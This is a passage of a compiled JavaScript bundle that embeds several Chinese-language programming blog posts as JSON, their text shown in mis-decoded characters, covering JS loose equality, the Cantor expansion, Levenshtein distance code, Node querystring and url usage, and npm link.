alt=\\"\\"></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-27","timeArr":[2018,9,27,0,0,0,0],"title":"è§£å†³disqusæ— æ³•æ­£ç¡®æ˜¾ç¤ºæ¯ä¸€ä¸ªcomment count","uuid":"7a618f35d69b48cbdbef3e7285fffc03098e720a","summary":"<p>åšå®¢æ·»åŠ äº†<code>disqus</code>ï¼Œå¹¶ä¸”åœ¨æ–‡ç« åˆ—è¡¨å¤„æ¯ä¸€ç¯‡æ ‡é¢˜è¾¹ä¸Šæ·»åŠ ä¸€ä¸ªè¯„è®ºè®¡æ•°å™¨ã€‚</p>\\n<p>å®ƒé€šè¿‡<code>identifier</code>å»è·å–ï¼Œ<code>identifier</code>åœ¨æ–‡ç« è¯¦æƒ…é¡µé¢æä¾›é…ç½®ã€‚</p>\\n<p>é—®é¢˜æ˜¯ï¼š<strong>è¿™ä¸ªè®¡æ•°å™¨å¹¶ä¸æ˜¯æ¯ä¸€ç¯‡æ–‡ç« éƒ½èƒ½æ­£ç¡®æ˜¾ç¤º</strong>ï¼Œæœ‰çš„åˆ—è¡¨èƒ½æ˜¾ç¤º2ä¸ªï¼Œæœ‰çš„åˆ—è¡¨ä¸€ä¸ªéƒ½ä¸æ˜¾ç¤ºï¼Œ</p>\\n<p>![](/article/img/commen...</p>","slug":"jie-jue-disqus-wu-fa-zheng-que-xian-shi-mei-yi-ge-comment-count","sha":"901e43a8e9f1c5cf70956f7fb9139ccb541370fd"}')},615:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"js-kuan-song-bi-jiao-==-gui-fan\\">JSå®½æ¾æ¯”è¾ƒ(==)è§„èŒƒ</h2>\\n<p>æ‘˜è‡ªã€Šä½ ä¸çŸ¥é“çš„javascriptã€‹</p>\\n<ol>\\n<li><p>å­—ç¬¦ä¸²å’Œæ•°å­—ä¹‹é—´çš„ç›¸ç­‰æ¯”è¾ƒ</p>\\n<blockquote>\\n<p>ES5 è§„èŒƒ 11.9.3.4-5 è¿™æ ·å®šä¹‰ï¼š</p>\\n<ol>\\n<li>å¦‚æœ Type(x) æ˜¯æ•°å­—ï¼Œ Type(y) æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› x == ToNumber(y)\\nçš„ç»“æœã€‚</li>\\n<li>å¦‚æœ Type(x) æ˜¯å­—ç¬¦ä¸²ï¼Œ Type(y) æ˜¯æ•°å­—ï¼Œåˆ™è¿”å› ToNumber(x) == y\\nçš„ç»“æœã€‚</li>\\n</ol>\\n</blockquote>\\n<p> ä¾‹å¦‚ï¼š<code>&quot;&quot; == 0; // true</code></p>\\n</li>\\n<li><p>å…¶ä»–ç±»å‹å’Œå¸ƒå°”ç±»å‹ä¹‹é—´çš„ç›¸ç­‰æ¯”è¾ƒ</p>\\n<blockquote>\\n<p>è§„èŒƒ 11.9.3.6-7 æ˜¯è¿™æ ·è¯´çš„ï¼š</p>\\n<ol>\\n<li>å¦‚æœ Type(x) æ˜¯å¸ƒå°”ç±»å‹ï¼Œåˆ™è¿”å› ToNumber(x) == y çš„ç»“æœï¼›</li>\\n<li>å¦‚æœ Type(y) æ˜¯å¸ƒå°”ç±»å‹ï¼Œåˆ™è¿”å› x == ToNumber(y) çš„ç»“æœã€‚</li>\\n</ol>\\n</blockquote>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  [] === <span class=\\"hljs-literal\\">true</span>;    <span class=\\"hljs-comment\\">// false</span>\\n  [] == <span class=\\"hljs-literal\\">true</span>;     <span class=\\"hljs-comment\\">// false</span>\\n  !![];            <span class=\\"hljs-comment\\">// true</span>\\n  <span class=\\"hljs-string\\">\\"42\\"</span> == <span class=\\"hljs-literal\\">true</span>;   <span class=\\"hljs-comment\\">// false</span>\\n  <span class=\\"hljs-literal\\">false</span> == <span class=\\"hljs-string\\">\\"\\"</span>;    <span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n</li>\\n<li><p>null å’Œ undefined ä¹‹é—´çš„ç›¸ç­‰æ¯”è¾ƒ</p>\\n<blockquote>\\n<p>ES5 è§„èŒƒ 11.9.3.2-3 è§„å®šï¼š</p>\\n<ol>\\n<li>å¦‚æœ x ä¸º null ï¼Œ y ä¸º undefined ï¼Œåˆ™ç»“æœä¸º true ã€‚</li>\\n<li>å¦‚æœ x ä¸º undefined ï¼Œ y ä¸º null ï¼Œåˆ™ç»“æœä¸º true ã€‚</li>\\n</ol>\\n</blockquote>\\n</li>\\n<li><p>å¯¹è±¡å’Œéå¯¹è±¡ä¹‹é—´çš„ç›¸ç­‰æ¯”è¾ƒ</p>\\n<blockquote>\\n<p>ES5 è§„èŒƒ 11.9.3.8-9 åšå¦‚ä¸‹è§„å®šï¼š</p>\\n<ol>\\n<li>å¦‚æœ Type(x) æ˜¯å­—ç¬¦ä¸²æˆ–æ•°å­—ï¼Œ Type(y) æ˜¯å¯¹è±¡ï¼Œåˆ™è¿”å› x == ToPrimitive(y)\\nçš„ç»“æœï¼›</li>\\n<li>å¦‚æœ Type(x) æ˜¯å¯¹è±¡ï¼Œ Type(y) æ˜¯å­—ç¬¦ä¸²æˆ–æ•°å­—ï¼Œåˆ™è¿”å› ToPromitive(x) == y\\nçš„ç»“æœã€‚</li>\\n</ol>\\n</blockquote>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> [<span class=\\"hljs-number\\">42</span>] == <span class=\\"hljs-number\\">42</span>;  <span class=\\"hljs-comment\\">// true</span>\\n [] == <span class=\\"hljs-string\\">\\"\\"</span>;    <span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n<p> <code>ToPromitive</code>ï¼šå°è¯•è½¬æ¢ä¸ºåŸå§‹å€¼</p>\\n<p> æ¯”è¾ƒè§„åˆ™ï¼šå…ˆä½¿ç”¨<code>valueOf</code>ï¼Œå¦‚æœä¸æ˜¯åŸå§‹å€¼ï¼Œåˆ™ä½¿ç”¨<code>toString</code>ï¼Œå¦‚æœè¿˜ä¸æ˜¯ï¼Œåˆ™æŠ›å‡ºé”™è¯¯ã€‚</p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"js-kuan-song-bi-jiao-==-gui-fan","level":2,"text":"JSå®½æ¾æ¯”è¾ƒ(==)è§„èŒƒ"}],"relatedTags":null,"created_at":"2018-07-10","timeArr":[2018,6,10,0,0,0,0],"title":"jså®½æ¾æ¯”è¾ƒè§„èŒƒ","uuid":"a0f124d6d5ccb06205fe4c0fcfcff8dd9fb16d44","summary":"<p>ES5 è§„èŒƒ 11.9.3.4-5 è¿™æ ·å®šä¹‰ï¼š</p>\\n<ol>\\n<li>å¦‚æœ Type(x) æ˜¯æ•°å­—ï¼Œ Type(y) æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› x == ToNumber(y)\\nçš„ç»“æœã€‚</li>\\n<li>å¦‚æœ Type(x) æ˜¯å­—ç¬¦ä¸²ï¼Œ Type(y) æ˜¯æ•°å­—ï¼Œåˆ™è¿”å› ToNumber(x) == y\\nçš„ç»“æœã€‚</li>\\n</ol>","slug":"js-kuan-song-bi-jiao-gui-fan","sha":"df2e9c8633809f2f352ba06bdcde43a83ec1b3b4"}')},616:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li><p>åº·æ‹“å±•å¼€</p>\\n<p>  ä¾‹å¦‚ï¼Œ<code>2431</code>æœ‰å¤šå°‘ç§æ’åˆ—æ–¹å¼ä¼šæ¯”å®ƒå°çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è®¡ç®—æ–¹å¼æ˜¯ï¼š</p>\\n<p>  <code>1 * 3! + 2 * 2! + 1 * 1! + 0 * 0! = 11</code></p>\\n<p>  è§£é‡Šï¼š</p>\\n<p>  ç¬¬ä¸€ä¸ªæ•°<code>2</code>ï¼Œæ¯”å®ƒå°çš„æœ‰1ä¸ªï¼Œåç»­èƒ½æ’åˆ—æ•°é‡æœ‰<code>3!</code></p>\\n<p>  ç¬¬äºŒä¸ªæ•°<code>4</code>ï¼Œå‡å»å®ƒä¹‹å‰çš„<code>2</code>ï¼Œæ¯”å®ƒå°çš„è¿˜æœ‰2ä¸ªï¼Œåç»­èƒ½æ’åˆ—æ•°é‡æœ‰<code>2!</code></p>\\n<p>  ç¬¬ä¸‰ä¸ªæ•°<code>3</code>ï¼Œå‡å»å®ƒä¹‹å‰çš„<code>2</code>ï¼Œæ¯”å®ƒå°çš„è¿˜æœ‰1ä¸ªï¼Œåç»­èƒ½æ’åˆ—æ•°é‡æœ‰<code>1!</code></p>\\n<p>  ...</p>\\n</li>\\n<li><p>åº·æ‹“é€†å±•å¼€</p>\\n<p>  ä¾‹å¦‚ <code>n=4, k=12</code></p>\\n<p>  é‚£ä¹ˆé¦–å…ˆå‰é¢æœ‰<code>k-1=11</code>ä¸ªæ’åºæ˜¯æ¯”å½“å‰å°çš„ã€‚</p>\\n<p>  ç¬¬ä¸€ä¸ªæ•°å­—ï¼Œ<code>11 é™¤ä»¥ 3!</code>ï¼Œç»“æœä¸º<code>1</code>ä½™<code>5</code>ï¼Œè¯´æ˜æœ‰1ä¸ªæ¯”å®ƒå°ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯<code>2</code>ï¼›</p>\\n<p>  ç¬¬äºŒä¸ªæ•°å­—ï¼Œ<code>5 é™¤ä»¥ 2!</code>ï¼Œç»“æœä¸º<code>2</code>ä½™<code>1</code>ï¼Œè¯´æ˜æœ‰2ä¸ªæ¯”å®ƒå°ï¼Œå› ä¸ºä¸Šé¢<code>2</code>å·²ç»ä½¿ç”¨äº†ï¼Œå› æ­¤è¿™é‡Œæ˜¯<code>4</code>ï¼›</p>\\n<p>  ç¬¬ä¸‰ä¸ªæ•°å­—ï¼Œ<code>1 é™¤ä»¥ 1!</code>ï¼Œç»“æœä¸º<code>1</code>ä½™<code>0</code>ï¼Œè¯´æ˜æœ‰1ä¸ªæ¯”å®ƒå°ï¼Œä¸Šé¢<code>2</code>å·²ç»ä½¿ç”¨äº†ï¼Œå› æ­¤è¿™é‡Œæ˜¯<code>3</code>ï¼›</p>\\n<p>  ç¬¬å››ä¸ªæ•°å­—ï¼Œ<code>0 é™¤ä»¥ 0!</code>ï¼Œ<code>0</code>ä¸ºåˆ†æ¯æ— æ³•è®¡ç®—ï¼Œè¿™é‡Œæ˜¯æœ€åä¸€ä¸ªæ•°å­—<code>1</code>ã€‚</p>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2019-03-29","timeArr":[2019,2,29,0,0,0,0],"title":"åº·æ‹“å±•å¼€ç®—æ³•","uuid":"25190dd0cd5c8e0af3419567a8b6216802ec408e","summary":"<ul>\\n<li>\\n<p>åº·æ‹“å±•å¼€</p>\\n<p>ä¾‹å¦‚ï¼Œ<code>2431</code>æœ‰å¤šå°‘ç§æ’åˆ—æ–¹å¼ä¼šæ¯”å®ƒå°çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è®¡ç®—æ–¹å¼æ˜¯ï¼š</p>\\n<p><code>1 * 3! + 2 * 2! + 1 * 1! + 0 * 0! = 11</code></p>\\n<p>è§£é‡Šï¼š</p>\\n<p>ç¬¬ä¸€ä¸ªæ•°<code>2</code>ï¼Œæ¯”å®ƒå°çš„æœ‰1ä¸ªï¼Œåç»­èƒ½æ’åˆ—æ•°é‡æœ‰<code>3!</code></p>\\n<p>ç¬¬äºŒä¸ª...</p>\\n</li>\\n</ul>","slug":"kang-tuo-zhan-kai-suan-fa","sha":"c0a7f96accec11aab2162dfcb3787daff1b25439"}')},617:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"xue-xi-levenshtein-distance-suan-fa\\">å­¦ä¹ Levenshtein Distanceç®—æ³•</h4>\\n<p>  ä»»æ„å•ä¸ªå­—ç¬¦å˜åŠ¨æœ‰3ç§æƒ…å†µï¼Œæ›¿æ¢ï¼Œå¢åŠ å’Œåˆ é™¤ï¼š</p>\\n<p><strong>1. å¦‚æœå¯¹åº”çš„å­—ç¬¦ç›¸åŒï¼Œåˆ™ä»å®ƒçš„å·¦ï¼Œæ–œæˆ–è€…ä¸Šæ–¹é€‰å–æœ€å°å€¼ï¼Œç›´æ¥å¡«å†™</strong>\\n<strong>2. å¦‚æœå¯¹åº”çš„å­—ç¬¦ä¸ç›¸åŒï¼Œåˆ™ä»å®ƒçš„å·¦ï¼Œæ–œæˆ–è€…ä¸Šæ–¹é€‰å–æœ€å°å€¼ï¼Œ+1åå¡«å†™</strong></p>\\n<p>æ‹¬å·å†…éƒ¨è¡¨ç¤ºéœ€è¦è¿›è¡Œç§»åŠ¨çš„æ­¥æ•°</p>\\n<ul>\\n<li><p>æƒ…å†µä¸€ï¼šä»abåˆ°acçš„å˜åŠ¨</p>\\n<p>xä½ç½® å­—ç¬¦ä¸ç›¸ç­‰(b!==c)ï¼Œä½†æ˜¯ iä½ç½®å˜åŠ¨æœ€å°ï¼Œæ‰€ä»¥ä»iä½ç½®çš„æ•°å€¼åŠ 1ï¼Œæ–œçº¿è¯´æ˜è¯´æ›¿æ¢</p>\\n<pre><code><pre class=\\"hljs\\"><code>  a     b\\na i(0) j(1)\\nc l(1)  x\\n// x=1</code></pre></code></pre></li>\\n<li><p>æƒ…å†µäºŒï¼šä»acdåˆ°acçš„å˜åŠ¨</p>\\n<p>xä½ç½® å­—ç¬¦ä¸ç›¸ç­‰(b!==c)ï¼Œä½†æ˜¯ mä½ç½®å˜åŠ¨æœ€å°ï¼Œæ‰€ä»¥ä»mä½ç½®çš„æ•°å€¼åŠ 1ï¼Œæ¨ªå‘è¯´æ˜å¢åŠ </p>\\n<pre><code><pre class=\\"hljs\\"><code>  a     c     d\\na i(0)  j(1)  k(2)\\nc l(1)  m(0)  x \\n// x=1</code></pre></code></pre></li>\\n<li><p>æƒ…å†µä¸‰ï¼šä»abåˆ°abcçš„å˜åŠ¨</p>\\n<p>xä½ç½® å­—ç¬¦ä¸ç›¸ç­‰(b!==c)ï¼Œä½†æ˜¯ lä½ç½®å˜åŠ¨æœ€å°ï¼Œæ‰€ä»¥ä»lä½ç½®çš„æ•°å€¼åŠ 1ï¼Œç«–å‘è¯´æ˜å‡å°‘</p>\\n<pre><code><pre class=\\"hljs\\"><code> a      b\\na i(0)  j(1)\\nb k(1)  l(0)\\nc m(2)  x\\n// x=1</code></pre></code></pre><p>æ¯ä¸€æ¬¡çš„åˆ¤æ–­æ‰€ç¡®å®šçš„æœ€å°å˜åŠ¨æ•°ï¼Œåˆæ˜¯ä¸‹ä¸€æ¬¡åˆ¤æ–­å˜åŠ¨çš„åŸºç¡€</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">minED</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n  <span class=\\"hljs-comment\\">// å…ˆåˆ›å»ºaå’Œbçš„äºŒç»´æ•°ç»„ï¼ˆæ¨ªç«–éƒ½é¢å¤–å¤šä¸€è¡Œï¼Œä½œä¸ºç¬¬ä¸€ä¸ªå­—ç¬¦æ¯”è¾ƒçš„åŸºç¡€ï¼‰</span>\\n  <span class=\\"hljs-keyword\\">let</span> arr=<span class=\\"hljs-built_in\\">Array</span>(b.length+<span class=\\"hljs-number\\">1</span>).fill(<span class=\\"hljs-literal\\">null</span>);\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;arr.length;i++){\\n    arr[i]=<span class=\\"hljs-built_in\\">Array</span>(a.length+<span class=\\"hljs-number\\">1</span>).fill(<span class=\\"hljs-literal\\">null</span>);\\n    <span class=\\"hljs-keyword\\">if</span>(i===<span class=\\"hljs-number\\">0</span>){\\n      <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=<span class=\\"hljs-number\\">0</span>;j&lt;arr[<span class=\\"hljs-number\\">0</span>].length;j++){arr[<span class=\\"hljs-number\\">0</span>][j]=j;}\\n    }\\n    arr[i][<span class=\\"hljs-number\\">0</span>]=i;\\n  }\\n  <span class=\\"hljs-comment\\">// å¯¹æ¯ä¸€ä¸ªå­—ç¬¦è¿›è¡Œæ¯”è¾ƒï¼Œåˆ©ç”¨ä¸Šä¸€æ¬¡æ¯”è¾ƒçš„åŸºç¡€</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>;i&lt;arr.length;i++){\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> j=<span class=\\"hljs-number\\">1</span>;j&lt;arr[i].length;j++){\\n      <span class=\\"hljs-keyword\\">let</span> count=<span class=\\"hljs-number\\">0</span>;\\n      <span class=\\"hljs-keyword\\">if</span>(b[i<span class=\\"hljs-number\\">-1</span>]!==a[j<span class=\\"hljs-number\\">-1</span>]){\\n        count++;\\n      }\\n      arr[i][j]=<span class=\\"hljs-built_in\\">Math</span>.min(arr[i<span class=\\"hljs-number\\">-1</span>][j<span class=\\"hljs-number\\">-1</span>],arr[i<span class=\\"hljs-number\\">-1</span>][j],arr[i][j<span class=\\"hljs-number\\">-1</span>])+count;\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> arr[b.length][a.length]\\n}\\n\\n<span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-string\\">\'abcd\'</span>,b=<span class=\\"hljs-string\\">\\"adbc\\"</span>\\nminED(a,b)</code></pre></code></pre>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-string\\">\'abcd\'</span>,b=<span class=\\"hljs-string\\">\\"adbc\\"</span>\\nminED(a,b)\\n\\n<span class=\\"hljs-comment\\">// è¾“å‡ºæ•°æ®ï¼š</span>\\n[ [ <span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-number\\">4</span> ],\\n  [ <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">3</span> ],\\n  [ <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">2</span> ],\\n  [ <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">3</span> ],\\n  [ <span class=\\"hljs-number\\">4</span>, <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span> ] ]</code></pre></code></pre>\\n<p>å› æ­¤ä»&#39;abcd&#39;å˜åŠ¨åˆ°&#39;adbc&#39;ï¼Œæœ€å°ç§»åŠ¨æ­¥æ•°æ˜¯2</p>\\n","toc":[{"anchor":"xue-xi-levenshtein-distance-suan-fa","level":4,"text":"å­¦ä¹ Levenshtein Distanceç®—æ³•"}],"relatedTags":null,"created_at":"2018-06-18","timeArr":[2018,5,18,0,0,0,0],"title":"ä¸¤ä¸ªå­—ç¬¦ä¸²æœ€å°ç¼–è¾‘è·ç¦»ç®—æ³•","uuid":"77f0065531e454cbcc9fad960f3cdbe37d6e2d25","summary":"<h4>å­¦ä¹ Levenshtein Distanceç®—æ³•</h4>\\n<p>ä»»æ„å•ä¸ªå­—ç¬¦å˜åŠ¨æœ‰3ç§æƒ…å†µï¼Œæ›¿æ¢ï¼Œå¢åŠ å’Œåˆ é™¤ï¼š</p>\\n<p><strong>1. å¦‚æœå¯¹åº”çš„å­—ç¬¦ç›¸åŒï¼Œåˆ™ä»å®ƒçš„å·¦ï¼Œæ–œæˆ–è€…ä¸Šæ–¹é€‰å–æœ€å°å€¼ï¼Œç›´æ¥å¡«å†™</strong>\\n<strong>2. å¦‚æœå¯¹åº”çš„å­—ç¬¦ä¸ç›¸åŒï¼Œåˆ™ä»å®ƒçš„å·¦ï¼Œæ–œæˆ–è€…ä¸Šæ–¹é€‰å–æœ€å°å€¼ï¼Œ+1åå¡«å†™</strong></p>\\n<p>æ‹¬å·å†…éƒ¨è¡¨ç¤ºéœ€è¦è¿›è¡Œç§»åŠ¨çš„æ­¥æ•°</p>\\n<ul>\\n<li>...</li>\\n</ul>","slug":"liang-ge-zi-fu-chuan-zui-xiao-bian-ji-ju-li-suan-fa","sha":"be3a5d23fd6575a2a323c8daa62b9432f71776ec"}')},618:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"querystring\\">querystring</h3>\\n<ul>\\n<li>querystring.stringify</li>\\n</ul>\\n<p>å‚æ•°ä¸€ï¼šè½¬æ¢å¯¹è±¡</p>\\n<p><code>querystring.stringify({x:1,y:2,c:[3,4]})</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>x=1&amp;y=2&amp;c=3&amp;c=4</code></p>\\n<p>å‚æ•°äºŒï¼šè¾“å‡ºè¿æ¥ç¬¦</p>\\n<p><code>querystring.stringify({x:1,y:2,c:[3,4]},&quot;,&quot;)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>x=1,y=2,c=3,c=4</code></p>\\n<p>å‚æ•°ä¸‰ï¼škey,valueè¿æ¥ç¬¦</p>\\n<p><code>querystring.stringify({x:1,y:2,c:[3,4]},&quot;,&quot;,&quot;:&quot;)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>x:1,y:2,c:3,c:4</code></p>\\n<ul>\\n<li>querystring.parse</li>\\n</ul>\\n<p>å‚æ•°ä¸€ï¼Œè½¬æ¢å¯¹è±¡</p>\\n<p><code>querystring.parse(&quot;x:1,y:2,c:3,c:4&quot;)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>{ &#39;x:1,y:2,c:3,c:4&#39;: &#39;&#39; }</code>è§£æé”™è¯¯ï¼Œè¡¥å……å‚æ•°</p>\\n<p>å‚æ•°äºŒï¼Œè¿æ¥ç¬¦</p>\\n<p><code>querystring.parse(&quot;x:1,y:2,c:3,c:4&quot;,&#39;,&#39;)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>{ &#39;x:1&#39;: &#39;&#39;, &#39;y:2&#39;: &#39;&#39;, &#39;c:3&#39;: &#39;&#39;, &#39;c:4&#39;: &#39;&#39; }</code>è§£æé”™è¯¯ï¼Œè¡¥å……å‚æ•°</p>\\n<p>å‚æ•°ä¸‰ï¼Œkey,valueè¿æ¥ç¬¦</p>\\n<p><code>querystring.parse(&quot;x:1,y:2,c:3,c:4&quot;,&#39;,&#39;,&#39;:&#39;)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>{ x: &#39;1&#39;, y: &#39;2&#39;, c: [ &#39;3&#39;, &#39;4&#39; ] }</code>è§£ææ­£ç¡®</p>\\n<p>å‚æ•°å››ï¼Œå¯æ¥å—å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ï¼Œé»˜è®¤ä¸º1000 </p>\\n<p>?? ä¸å¸¸ç”¨</p>\\n<ul>\\n<li>querystring.escape</li>\\n</ul>\\n<p>è½¬ä¹‰ï¼Œ<code>window.encodeURIComponent</code></p>\\n<p><code>querystring.escape(&#39;&lt;ä½ å¥½&gt;&#39;)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>%3C%E4%BD%A0%E5%A5%BD%3E</code></p>\\n<ul>\\n<li>querystring.unescape</li>\\n</ul>\\n<p>åè½¬ä¹‰ï¼Œ<code>window.decodeURIComponent</code></p>\\n<p><code>querystring.unescape(&#39;%3C%E4%BD%A0%E5%A5%BD%3E&#39;)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>&lt;ä½ å¥½&gt;</code></p>\\n<hr>\\n<h3 id=\\"urlparse\\">url.parse</h3>\\n<p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šurlåœ°å€\\n<code>url.parse(&#39;http://www.somesite.com:8080/video?x=1&amp;y=2&#39;)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>Url {\\n  protocol: \'http:\',\\n  slashes: true,\\n  auth: null,\\n  host: \'www.somesite.com:8080\',\\n  port: \'8080\',\\n  hostname: \'www.somesite.com\',\\n  hash: null,\\n  search: \'?x=1&amp;y=2\',\\n  query: \'x=1&amp;y=2\',\\n  pathname: \'/video\',\\n  path: \'/video?x=1&amp;y=2\',\\n  href: \'http://www.somesite.com:8080/video?x=1&amp;y=2\' }</code></pre></code></pre><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šæ˜¯å¦è§£æquery</p>\\n<p><code>url.parse(&#39;http://www.somesite.com:8080/video?x=1&amp;y=2&#39;,true)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>Url {\\n  protocol: \'http:\',\\n  slashes: true,\\n  auth: null,\\n  host: \'www.somesite.com:8080\',\\n  port: \'8080\',\\n  hostname: \'www.somesite.com\',\\n  hash: null,\\n  search: \'?x=1&amp;y=2\',\\n  query: { x: \'1\', y: \'2\' },\\n  pathname: \'/video\',\\n  path: \'/video?x=1&amp;y=2\',\\n  href: \'http://www.somesite.com:8080/video?x=1&amp;y=2\' }</code></pre></code></pre><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šæ˜¯å¦å¯ä»¥çœç•¥protocol</p>\\n<p><code>url.parse(&#39;//www.somesite.com:8080/video?x=1&amp;y=2&#39;,true,true)</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>Url {\\n  protocol: null,\\n  slashes: true,\\n  auth: null,\\n  host: \'www.somesite.com:8080\',\\n  port: \'8080\',\\n  hostname: \'www.somesite.com\',\\n  hash: null,\\n  search: \'?x=1&amp;y=2\',\\n  query: { x: \'1\', y: \'2\' },\\n  pathname: \'/video\',\\n  path: \'/video?x=1&amp;y=2\',\\n  href: \'//www.somesite.com:8080/video?x=1&amp;y=2\' }</code></pre></code></pre><h3 id=\\"urlresolve\\">url.resolve</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> url = <span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'url\'</span>);\\nurl.resolve(<span class=\\"hljs-string\\">\'/one/two/three\'</span>, <span class=\\"hljs-string\\">\'four\'</span>);         <span class=\\"hljs-comment\\">// \'/one/two/four\'</span>\\nurl.resolve(<span class=\\"hljs-string\\">\'http://example.com/\'</span>, <span class=\\"hljs-string\\">\'/one\'</span>);    <span class=\\"hljs-comment\\">// \'http://example.com/one\'</span>\\nurl.resolve(<span class=\\"hljs-string\\">\'http://example.com/one\'</span>, <span class=\\"hljs-string\\">\'/two\'</span>); <span class=\\"hljs-comment\\">// \'http://example.com/two\'</span></code></pre></code></pre>\\n","toc":[{"anchor":"querystring","level":3,"text":"querystring"},{"anchor":"urlparse","level":3,"text":"url.parse"},{"anchor":"urlresolve","level":3,"text":"url.resolve"}],"relatedTags":null,"created_at":"2018-12-05","timeArr":[2018,11,5,0,0,0,0],"title":"node-querystringå’Œurlç¬”è®°","uuid":"87971cd868e8cd749775bd93de4025ef1746d9d7","summary":"<h4>querystring</h4>\\n<ul>\\n<li>querystring.stringify</li>\\n</ul>\\n<p>å‚æ•°ä¸€ï¼šè½¬æ¢å¯¹è±¡</p>\\n<p><code>querystring.stringify({x:1,y:2,c:[3,4]})</code></p>\\n<p>è¾“å‡ºï¼š</p>\\n<p><code>x=1&amp;y=2&amp;c=3&amp;c=4</code></p>\\n<p>å‚æ•°äºŒï¼šè¾“å‡ºè¿æ¥ç¬¦</p>\\n<p>`querystring.stringify({x:1,y...</p>","slug":"node-querystring-he-url-bi-ji","sha":"65baf42e906ec1137456584196cc311c143c7570"}')},619:function(n){n.exports=JSON.parse('{"content":"<p>å…³äº<code>npm-link</code>çš„ä½¿ç”¨</p>\\n<p>å½“å¼€å‘é¡¹ç›®æ—¶ï¼Œæœ‰æ—¶å€™ä¼šæƒ³ç”¨ä¸€ä¸ªæœ¬åœ°çš„å·¥å…·ï¼Œå¤åˆ¶æºç ä»€ä¹ˆçš„å¤ªéº»çƒ¦äº†ï¼Œå‘å¸ƒåˆ°npmä¹Ÿå¾ˆéº»çƒ¦ï¼Œå°±åªæƒ³ç›´æ¥ç”¨ã€‚\\né‚£ä¹ˆå¯ä»¥è€ƒè™‘ä½¿ç”¨<code>npm-link</code>ã€‚</p>\\n<p>ç°åœ¨æˆ‘æœ‰ä¸€ä¸ªå·¥å…·é¡¹ç›®å«åš<code>tool</code></p>\\n<p>æˆ‘å¯ä»¥å…ˆæ³¨å†Œåˆ°å…¨å±€</p>\\n<p><code>npm link tool</code></p>\\n<p>æ¥ç€ï¼Œæ‰¾åˆ°æˆ‘æƒ³å¯¼å…¥çš„é¡¹ç›®ï¼š<code>cd project</code>ï¼Œåœ¨å½“å‰é¡¹ç›®ç›®å½•ä¸‹ï¼š</p>\\n<p><code>npm link tool</code></p>\\n<p>è¿™æ ·ï¼Œå°±ä¼šå°†è¿™ä¸ª<code>tool</code>åŠ 